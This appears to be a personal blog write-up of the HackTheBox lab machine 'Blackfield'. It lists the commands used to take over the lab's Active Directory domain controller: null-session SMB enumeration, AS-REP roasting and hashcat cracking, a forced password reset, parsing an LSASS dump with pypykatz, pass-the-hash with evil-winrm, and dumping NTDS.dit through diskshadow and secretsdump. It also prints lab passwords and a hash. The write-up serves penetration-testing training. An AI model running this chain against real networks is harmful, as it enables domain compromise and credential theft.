---
layout: post
title: "Blackfield"
date: 2024-12-28
author: cotes
categories: [Writeup, HackTheBox]
tags: [HTB, Writeup, Security]
pin: true
math: true
mermaid: true
image:
  path: /assets/img/commons/hackthebox.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hackthebox Image
---

`sudo nmap -sC -sV -p- 10.10.10.192 -oN blackfield -T4 
![[Pasted image 20240528212507.png]]
 looks like a DC  , so let's try to enumerate 
 I tried rpcclient null session , and ldap null session , and tried to look for shares. 
the weird things here is smbclient did show a list of shares , while nxc (using -u ''-p'' )shows that we don't have permission to enumerate the shares .

when dealing with smb shares the best way to enumerate is smbmap

`smbmap -H 10.10.10.192 -u null`
![[Pasted image 20240528215120.png]]

we can read ==profiles$==
seems like list of users , let's create a wordlists with this users and try asreproasting 
![[Pasted image 20240528215355.png]]

`impacket-GetNPUsers Blackfield.local/  -usersfile users.txt	`
![[Pasted image 20240528215859.png]]

let's crack it 
`hashcat -a 0 -m 18200 asreperoasting /usr/share/wordlists/rockyou.txt `
![[Pasted image 20240528220522.png]]

we got support password , let's run bloodhound 
`nxc ldap 10.10.10.192 -u 'support' -p '#00^BlackKnight' -c all --bloodhound -ns 10.10.10.192
`
![[Pasted image 20240528220830.png]]

after uploading it to bloodhound we can see that our user has ==forcechangepassword== over ==audit2020== 

`net rpc password "AUDIT2020" "d0s3nt123@" -U "BLACKFIELD.LOCAL"/"support"%"#00^BlackKnight" -S "DC01.BLACKFIELD.LOCAL"
`
`nxc smb 10.10.10.192 -u 'AUDIT2020' -p 'd0s3nt123@'  `
![[Pasted image 20240528221919.png]]

let's enumerate shares using this new credentials 
`nxc smb 10.10.10.192 -u 'AUDIT2020' -p 'd0s3nt123@' --shares
![[Pasted image 20240528222207.png]]`

if we spider this share 
`nxc smb 10.10.10.192 -u 'AUDIT2020' -p 'd0s3nt123@' --share forencsic -M spider_plus
`
very juicy
![[Pasted image 20240528222511.png]]

after getting the zip and unzip the files , we can use ==pypkatz== to read the contend of the DUMP 
`pypykatz lsa minidump  lsass.DMP
![[Pasted image 20240528222912.png]]
we found couples of hashes but the only that work was ==svc_backup== 
let's see what we can do with it , back to ==bloodhound==

we can get shell using ==evil-winrm== 
![[Pasted image 20240528222958.png]]

`evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'`
![[Pasted image 20240528223137.png]]


this user is part of backup operator group so we can use it to read any files we want on the box 
at first I tried to dump the ==SAM== But the administrator hash on it didn't work
`reg save HKLM\SAM sam`
`reg save HKLM\SYSTEM system`
![[Pasted image 20240528223354.png]]

![[Pasted image 20240528223450.png]]

we can host an smbserver and transfer it very quick 

but the SAM database will not lead us anywhere 

so I tried to dump the ==NTDS==

for that I need to used ==diskshadow.exe== utility
we can use the following script with the diskshadows.exe (I took it  from https://academy.hackthebox.com/module/67/section/601)
![[Pasted image 20240528224528.png]]

before send it to the machine , we need ==unix2dos== so the stupid windows can read our script
![[Pasted image 20240528224701.png]]

![[Pasted image 20240528224753.png]]

`diskshadow.exe /s disk.txt`
![[Pasted image 20240528224954.png]]


![[Pasted image 20240528225012.png]]

we can now host an smbserver and transfer the ==NTDS.dit== easily
then use ==secretsdump to read the NTDS==
`impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV LOCAL`
![[Pasted image 20240528225243.png]]

![[Pasted image 20240528225358.png]]